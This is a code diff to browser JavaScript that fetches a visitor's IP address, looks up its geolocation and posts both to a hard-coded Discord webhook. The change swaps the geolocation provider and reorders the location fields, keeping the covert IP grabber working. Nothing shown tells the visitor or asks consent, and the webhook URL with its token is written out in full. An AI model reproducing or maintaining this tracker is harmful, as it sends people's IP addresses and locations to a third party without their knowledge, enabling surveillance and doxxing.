@@ -13,8 +13,8 @@
                 let ipData = await ipResponse.json();
                 let ip = ipData.ip;
 
-                // Fetch the geolocation data
-                let locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                // Fetch the geolocation data using api.iplocation.net
+                let locationResponse = await fetch(`https://api.iplocation.net/?ip=${ip}`);
                 let locationData = await locationResponse.json();
                 return { ip: ip, location: locationData };
             } catch (error) {
@@ -26,7 +26,7 @@
         async function sendToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
             const payload = {
-                content: `User IP Address: ${data.ip}\nLocation: ${data.location.city}, ${data.location.region}, ${data.location.country_name}`
+                content: `User IP Address: ${data.ip}\nLocation: ${data.location.country_name}, ${data.location.region_name}, ${data.location.city}`
             };
 
             try {
